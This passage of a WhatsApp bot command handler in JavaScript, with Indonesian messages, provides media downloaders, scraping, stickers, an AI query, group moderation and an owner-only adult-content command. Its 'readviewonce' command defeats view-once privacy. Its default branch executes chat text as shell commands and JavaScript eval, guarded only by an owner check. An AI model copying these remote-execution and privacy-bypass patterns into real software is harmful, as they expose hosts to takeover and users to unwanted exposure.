        m.reply("❌ Terjadi kesalahan saat mengambil file.")
    }
}
break

case "get":
case "fetch": {
    if (!text) return m.reply("Masukkan URL")
    if (!/^https?:\/\//i.test(text)) text = "http://" + text

    await sock.sendMessage(m.chat, {
        react: { text: "⚡", key: m.key }
    })

    let res
    try {
        res = await axios.get(text, {
            responseType: "arraybuffer",
            timeout: 15000,
            maxRedirects: 5,
            headers: {
                "user-agent":
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
            }
        })
    } catch (e) {
        return m.reply("❌ Gagal fetch URL:\n" + e.message)
    }

    const headers = res.headers || {}
    const type = (headers["content-type"] || "").split(";")[0]
    const size = Number(headers["content-length"] || 0)

    if (size > 200 * 1024 * 1024)
        return m.reply("❌ File terlalu besar (>200MB)")

    let filename = "file"
    try {
        const urlObj = new URL(res.request?.res?.responseUrl || text)
        filename = urlObj.pathname.split("/").pop() || "file"
    } catch {}

    const buffer = Buffer.from(res.data)

    
    if (type.startsWith("image/")) {
        return await sock.sendMessage(
            m.chat,
            { image: buffer, caption: text },
            { quoted: m }
        )
    }

    
    if (type === "application/json") {
        try {
            const json = JSON.parse(buffer.toString())
            const pretty = JSON.stringify(json, null, 2)

            await m.reply(pretty.slice(0, 65536))

            return await sock.sendMessage(
                m.chat,
                {
                    document: Buffer.from(pretty),
                    fileName: "file.json",
                    mimetype: "application/json"
                },
                { quoted: m }
            )
        } catch {
            return m.reply("❌ JSON rusak / tidak valid")
        }
    }

    
    if (type.startsWith("text/")) {
        const txt = buffer.toString("utf8")

        await m.reply(txt.slice(0, 65536))

        return await sock.sendMessage(
            m.chat,
            {
                document: Buffer.from(txt),
                fileName: type === "text/html" ? "file.html" : "file.txt",
                mimetype: type
            },
            { quoted: m }
        )
    }

    
    await sock.sendMessage(
        m.chat,
        {
            document: buffer,
            fileName: filename,
            mimetype: type || "application/octet-stream"
        },
        { quoted: m }
    )
}
break

case "hd2":
case "hdr": {
    const q = m.quoted ? m.quoted : m
    const mime = (q.msg || q).mimetype || ""

    if (!/image/.test(mime))
        return m.reply(`Kirim / reply gambar dengan caption ${prefix + command}`)

    await sock.sendMessage(m.chat, {
        react: { text: "🧭", key: m.key }
    })

    try {
        const media = await q.download()
        if (!media) return m.reply("❌ Gagal download gambar")

        // scale: hdr = 4 | hd = 2
        const scale = /^hdr$/i.test(command) ? 4 : 2

        const result = await hdr(media, scale)

        await sock.sendMessage(
            m.chat,
            {
                image: result,
                caption: "✨ Success HD kan foto anda"
            },
            { quoted: m }
        )

    } catch (err) {
        console.error("HD/HDR ERROR:", err)
        m.reply("❌ Gagal memproses gambar.")
    }
}
break

case "twitter":
case "x": {
    if (!text) return m.reply("Masukkan URL twitter nya")

    await sock.sendMessage(m.chat, {
        react: { text: "🐦", key: m.key }
    })

    try {
        const result = await twitter(text)

        if (result.type === "video") {
            let vid =
                result.download.find(v => v.type === "mp4" && v.reso === "1024p") ||
                result.download.find(v => v.type === "mp4")

            if (!vid)
                return sock.sendMessage(m.chat, {
                    sticker: { url: "https://files.catbox.moe/rd9i0t.jpg" }
                })

            await sock.sendMessage(
                m.chat,
                { video: { url: vid.url }, caption: "Success Twitter Video" },
                { quoted: m }
            )

        } else if (result.type === "image") {
            const img = result.download[0]
            if (!img)
                return sock.sendMessage(m.chat, {
                    sticker: { url: "https://files.catbox.moe/rd9i0t.jpg" }
                })

            await sock.sendMessage(
                m.chat,
                { image: { url: img.url }, caption: "Success Twitter Image" },
                { quoted: m }
            )

        } else {
            await sock.sendMessage(m.chat, {
                sticker: { url: "https://files.catbox.moe/rd9i0t.jpg" }
            })
        }

    } catch (err) {
        console.error("TWITTER ERROR:", err)
        m.reply("❌ Gagal download Twitter")
    }
}
break

case "tm":
case "bola":
case "transfermarkt": {
    if (!text)
        return m.reply(`Masukkan nama pemain!\nContoh: ${prefix + command} Cristiano Ronaldo`)

    await sock.sendMessage(m.chat, {
        react: { text: "⚽", key: m.key }
    })

    try {
        const query = encodeURIComponent(text)
        const search = await axios.get(
            `https://www.transfermarkt.com/schnellsuche/ergebnis/schnellsuche?query=${query}`,
            { headers }
        )

        const $s = cheerio.load(search.data)
        const firstPlayer = $s('.box:has(h2:contains("Search results for players")) tbody tr').first()
        const profilePath = firstPlayer.find('.hauptlink a').attr('href')

        if (!profilePath) throw "Pemain tidak ditemukan"

        const profileUrl = "https://www.transfermarkt.com" + profilePath
        const profile = await axios.get(profileUrl, { headers })
        const $ = cheerio.load(profile.data)
        const h = $('.data-header')

        const res = {
            name: h.find('h1 strong').text().trim() || h.find('h1').text().trim(),
            number: h.find('.data-header__shirt-number').text().trim() || '-',
            club: h.find('.data-header__club a').first().text().trim() || 'No Club',
            value: h.find('.data-header__market-value-wrapper')
                .clone().children().remove().end().text().trim() || 'N/A',
            image:
                h.find('.data-header__profile-image').attr('src') ||
                'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png',
            position: h.find('li:contains("Position") .data-header__content').text().trim() || '-',
            age: h.find('li:contains("Age") .data-header__content').text().trim() || '-',
            country: h.find('li:contains("Citizenship") .data-header__content')
                .text().trim().replace(/\s+/g, ' ') || '-'
        }

        let caption = `⚽ *INFORMASI PEMAIN SEPAK BOLA*\n\n`
        caption += `*Nama pemain:* ${res.name}\n`
        caption += `*Nomor pemain:* ${res.number}\n`
        caption += `*Tanggal lahir pemain:* ${res.age}\n`
        caption += `*Negara pemain:* ${res.country}\n`
        caption += `*Posisi pemain:* ${res.position}\n`
        caption += `*Club pemain:* ${res.club}\n`
        caption += `*Harga pemain:* ${res.value}\n\n`
        caption += `*Sumber real:* ${profileUrl}`

        await sock.sendMessage(
            m.chat,
            {
                image: { url: res.image },
                caption,
                contextInfo: {
                    externalAdReply: {
                        title: "BY ANDRI STORE",
                        body: "Subscribe YouTube andristoreID",
                        thumbnailUrl: "https://files.catbox.moe/8a47au.jpg",
                        sourceUrl: profileUrl,
                        mediaType: 1,
                        renderLargerThumbnail: false
                    }
                }
            },
            { quoted: m }
        )

        await sock.sendMessage(m.chat, {
            react: { text: "✅", key: m.key }
        })

    } catch (err) {
        console.error("TRANSFERMARKT ERROR:", err)
        m.reply("❌ Gagal mendapatkan data pemain")
    }
}
break

case "swm":
case "wm": {
    if (!quoted || !/image|video/.test(mime))
        return m.reply(`Reply gambar / video\nContoh:\n${prefix + command} ANDRI STORE|By Andri`)

    let [pack = global.namaBot || "ANDRI STORE", author = global.namaOwner || ""] =
        text.split("|").map(v => v.trim())

    try {
        // download media (sesuai sistem WazOF)
        const mediaPath = await sock.downloadAndSaveMediaMessage(quoted)

        const sticker = new Sticker(mediaPath, {
            pack,
            author,
            type: StickerTypes.FULL,
            quality: 80,
            background: "#00000000"
        })

        const buffer = await sticker.toBuffer()

        await sock.sendMessage(
            m.chat,
            { sticker: buffer },
            { quoted: m }
        )

        if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath)

    } catch (err) {
        console.error("SWM ERROR:", err)
        reply("❌ Gagal membuat stiker")
    }
}
break
        
case "ai":
case "groq":        {
  if (!text)
    return m.reply(
      `Contoh:\n${prefix}ai jelaskan black hole\nAtau:\n${prefix}ai buatkan gambar kucing astronot --style ghibli-style`
    )

  await sock.sendMessage(m.chat, {
    react: { text: "⏳", key: m.key }
  })

  try {
    // ===== MODE GAMBAR =====
    if (isImageRequest(text)) {
      let style = "flataipro"
      const styleMatch = text.match(/--style\s+([a-z0-9_-]+)/i)
      if (styleMatch && STYLES[styleMatch[1]]) style = styleMatch[1]

      const prompt = text
        .replace(/--style\s+[a-z0-9_-]+/gi, "")
        .replace(/buatkan gambar|bikinin gambar|gambar|foto|image/gi, "")
        .trim()

      if (!prompt) return reply("Prompt gambar tidak boleh kosong")

      const images = await flatai(prompt, style)

      await sock.sendMessage(
        m.chat,
        {
          image: { url: images[0] },
          caption:
            `>Hasil Gambar Anda\n` +
            `Prompt: ${prompt}\n` +
            `Style: ${style}`
        },
        { quoted: m }
      )

      await sock.sendMessage(m.chat, {
        react: { text: "✅", key: m.key }
      })
      break
    }

    // ===== MODE TEKS =====
    const raw = await groqCompoundQuery(text)
    const result = normalizeAsterisks(raw)

    await sock.sendMessage(
      m.chat,
      { text: result + "\n\n> Groq AI\n> BY ANDRI STORE" },
      { quoted: m }
    )

    await sock.sendMessage(m.chat, {
      react: { text: "✅", key: m.key }
    })
    
  } catch (e) {
    console.error(e)
    reply("❌ Terjadi kesalahan saat memproses AI")
  }
}
break

case "kick": {
    if (!m.isGroup) return m.reply(mess.group)

    if (!isAdmin)
        return m.reply(mess.admin)

    if (!isBotAdmin)
        return m.reply(mess.botAdmin)

    if (!text && !m.quoted)
        return m.reply("❌ Reply atau masukkan nomor yang ingin di kick")

    let users = m.quoted
        ? m.quoted.sender
        : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

    await sock.groupParticipantsUpdate(
        m.chat,
        [users],
        "remove"
    )

    m.reply("Success kick you,jauh² kau bujang🗿")
}
break

case "delete":
case "del": {
    if (!m.isGroup) return m.reply(mess.group)
    if (!isAdmin) return m.reply(mess.admin)
    if (!isBotAdmin) return m.reply(mess.botAdmin)

    if (!m.quoted)
        return reply("Reply pesan yang mau dihapus, lalu ketik *.delete*")

    try {
        await sock.sendMessage(m.chat, {
            react: { text: "🧭", key: m.key }
        })

        await sock.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.quoted.id,
                participant: m.quoted.sender
            }
        })
       m.reply("Success delete pesan hama🗿")  
    } catch (err) {
        console.error(err)
        reply("❌ Gagal menghapus pesan, mungkin pesan terlalu lama atau bukan dari member.")
    }
}
break

case "hidetag":
case "h": {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmin) return reply(mess.admin)
    if (!isBotAdmin) return reply(mess.botAdmin)

    let message =
        text ||
        m.quoted?.text ||
        m.quoted?.caption

    if (!message)
        return reply("Kirim teks atau reply pesan untuk dihidetag.")

    let member = []

    // fallback kalau participants kosong
    if (!participants || !participants.length) {
        const meta = await sock.groupMetadata(m.chat)
        member = meta.participants.map(v => v.id)
    } else {
        member = participants.map(v => v.id)
    }

    await sock.sendMessage(
        m.chat,
        {
            text: message,
            mentions: member
        },
        { quoted: m }
    )
}
break

case "closegc":
case "close":
case "opengc":
case "open": {
    if (!m.isGroup) return reply(mess.group)
    if (!isBotAdmin) return reply(mess.botAdmin)
    if (!isAdmin && !isAn) return reply(mess.admin)

    // buka grup
    if (/open|opengc/i.test(command)) {
        if (groupMetadata.announce === false)
            return reply("✅ Grup sudah terbuka sebelumnya")

        await sock.groupSettingUpdate(
            m.chat,
            "not_announcement"
        )
        reply("🔓 Grup berhasil dibuka,hama dipersilahkan yapping")
    }

    // tutup grup
    else if (/close|closegc/i.test(command)) {
        if (groupMetadata.announce === true)
            return reply("🔒 Grup sudah tertutup sebelumnya")

        await sock.groupSettingUpdate(
            m.chat,
            "announcement"
        )
        reply("🔒 Grup berhasil ditutup,hama dilarang yapping")
    }
}
break

case "linkgc":
case "infogc": {
    if (!m.isGroup) return reply(mess.group)
    if (!isBotAdmin) return reply(mess.botAdmin)
    if (!isAdmin && !isAn) return reply(mess.admin)

    const urlGrup =
        "https://chat.whatsapp.com/" +
        await sock.groupInviteCode(m.chat)

    const ownerNumber = groupOwner
        ? groupOwner.split("@")[0]
        : "Tidak diketahui"

    const createdAt = groupMetadata?.creation
        ? new Date(groupMetadata.creation * 1000).toLocaleDateString("id-ID", {
              day: "2-digit",
              month: "long",
              year: "numeric"
          })
        : "Tidak diketahui"

    const totalMember = participants.length

    let teks = `*「INFO LENGKAP GROUP INI」*

✧ Nama Group : ${groupName}
✧ Pembuat Group : @${ownerNumber}
✧ Tanggal Dibuat : ${createdAt}
✧ Total Member : ${totalMember}

✧ Link Group :
${urlGrup}

> © andri store`

    await sock.sendMessage(
        m.chat,
        {
            text: teks,
            mentions: groupOwner ? [groupOwner] : []
        },
        { quoted: m }
    )
}
break

case "tagall":
case "everyone": {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmin && !isAn) return reply(mess.owner)

    let me = m.sender
    let teks = (
        `╚»˙·٠📍 Tag All 📍٠·˙«╝\n` +
        `😶 *Tagger :* @${m.pushName}\n` +
        `🌿 *Pesan :* ${q ? q : "no message"}\n\n`
    )

    for (let mem of participants) {
        if (!mem.id) continue
        teks += `╰┈➤ @${mem.id.split("@")[0]}\n`
    }

    await sock.sendMessage(
        m.chat,
        {
            text: teks,
            mentions: participants.map(p => p.id)
        },
        { quoted: m }
    )
}
break

case 'readviewonce':
case 'rvo': {
    if (!m.quoted) return m.reply('Balas atau reply pesan yang ingin di readviewonce');

    try {
        const q = m.quoted;
        const msg = q.msg || q;
        const mime = msg.mimetype || '';
        const captionAsli =
            msg.caption ||
            q.caption ||
            q.text ||
            '🔥 Success readviewonce';

        if (!mime) return m.reply('Jenis media tidak dikenali');

        let mediaPath;
        try {
            mediaPath = await sock.downloadAndSaveMediaMessage(q);
        } catch (e) {
            console.error('[RVO ERROR]', e);
            return m.reply('Gagal mengunduh media');
        }

        let sendOpt = {
            quoted: m,
            caption: captionAsli
        };

        if (/image/.test(mime)) {
            sendOpt.image = { url: mediaPath };
        } else if (/video/.test(mime)) {
            sendOpt.video = { url: mediaPath };
        } else if (/audio/.test(mime)) {
            sendOpt.audio = { url: mediaPath };
            sendOpt.mimetype = mime;
            sendOpt.ptt = false;
        } else if (/document/.test(mime)) {
            sendOpt.document = { url: mediaPath };
            sendOpt.mimetype = mime;
            sendOpt.fileName = msg.fileName || 'file';
        } else if (/sticker/.test(mime)) {
            sendOpt.sticker = { url: mediaPath };
        } else {
            if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
            return m.reply('Jenis media tidak didukung');
        }

        await sock.sendMessage(m.chat, sendOpt);

        if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);

    } catch (err) {
        console.error('[RVO ERROR]', err);
        m.reply('Gagal membaca view once');
    }
}
break;

case "hentai": {

    if (!isAn) return reply(mess.owner)
      
    await sock.sendMessage(m.chat, {
        react: { text: "🔞", key: m.key }
    });

    try {
        const res = await axios.get(
            "https://api.vreden.my.id/api/v1/random/hentai",
            { timeout: 30000 }
        );

        const anu = res.data;
        if (!anu || !anu.result || anu.result.length < 1) {
            return m.reply("⚠️ Tidak ada data ditemukan");
        }

        // ambil random
        const rand = anu.result[Math.floor(Math.random() * anu.result.length)];

        let caption = `*🔞 HENTAI RANDOM*\n\n` +
            `📌 Judul : ${rand.title || "-"}\n` +
            `📂 Kategori : ${rand.category || "-"}\n` +
            `👀 Views : ${rand.views_count || "0"}\n` +
            `🔗 Link url : ${rand.link || "-"}\n`;

        if (rand.video_1) {
            await sock.sendMessage(
                m.chat,
                {
                    video: { url: rand.video_1 },
                    caption,
                    mimetype: "video/mp4"
                },
                { quoted: m }
            );
        } else {
            await m.reply(caption + `\n⚠️ Video tidak tersedia.`);
        }

    } catch (err) {
        console.error("[HENTAI ERROR]", err);
        m.reply("⚠️ Terjadi kesalahan saat mengambil data");
    }

    await sock.sendMessage(m.chat, {
        react: { text: "✅", key: m.key }
    });
}
break;

case "sc":
case "script": {
    const teks = `*「SCRIPT ANDRI STORE V2」*

╰┈➤ Script ini udah siap kamu download, lengkap dengan cara setup-nya di channel YouTube gw!

╰┈➤ Jangan lupa support channel gw biar makin semangat update ya. 

╰┈➤ Kalau nyari yang no enc all tinggal hubungi saja developer cukup klik atau tekan button yang di bawah GET TO OWNER. 

🚀 Thanks for you support and buy script`;

    const msgii = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: {
                            mentionedJid: [m.sender],
                            externalAdReply: {
                                showAdAttribution: true
                            }
                        },
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "© ANDRI STORE"
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📺 GET TO SCRIPT",
                                        url: "https://youtube.com/@andristoreID",
                                        merchant_url: "https://youtube.com"
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📢 GET TO CHANNEL",
                                        url: "https://whatsapp.com/channel/0029VbBW0L5AYlUPmohzsS0Y",
                                        merchant_url: "https://whatsapp.com"
                                    })
                                }, 
                                {
name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "⸙ GET TO OWNER",
                                        url: "https://wa.me/6281934874758",
                                        merchant_url: "https://wa.me.com"
                                    })                                
                                
                                }
                            ]
                        })
                    })
                }
            }
        },
        { userJid: m.sender, quoted: m }
    );

    await sock.relayMessage(
        msgii.key.remoteJid,
        msgii.message,
        { messageId: msgii.key.id }
    );
}
break;


        
//=============================================//
default: {
    if (body.startsWith("$")) { 
        if (!isAn) return reply(mess.owner)
        exec(body.slice(1).trim(), (err, stdout) => {
            if (err) return m.reply(`${err}`);
            if (stdout) return m.reply(`${stdout}`);
        });
    }

    if (body.startsWith(">")) { 
        if (!isAn) return reply(mess.owner)
        try {
            let code = body.slice(1).trim();
            let result = await eval(`(async () => { 
                try { return ${code} } catch { return await ${code} } 
            })()`); 
            m.reply(util.format(result));
        } catch (e) {
            m.reply(String(e));
        }
    }

    if (body.startsWith("eval")) { 
        if (!isAn) return reply(mess.owner)
        try {
            let code = body.slice(4).trim();
            let result = await eval(`(async () => {
                ${code}
            })()`);
            m.reply(util.format(result));
        } catch (e) {
            m.reply(String(e));
        }
     }
   }
 }
} catch (err) {
console.log(err)
await sock.sendMessage(global.owner+"@s.whatsapp.net", {text: err.toString()}, {quoted: m})
}}

//=============================================//
const __filename = fileURLToPath(import.meta.url);
fsSync.watchFile(__filename, () => { 
    fsSync.unwatchFile(__filename); 
    console.log(chalk.white.bold("~> Update File :"), chalk.green.bold(__filename));
    import(`${pathToFileURL(__filename).href}?update=${Date.now()}`);
});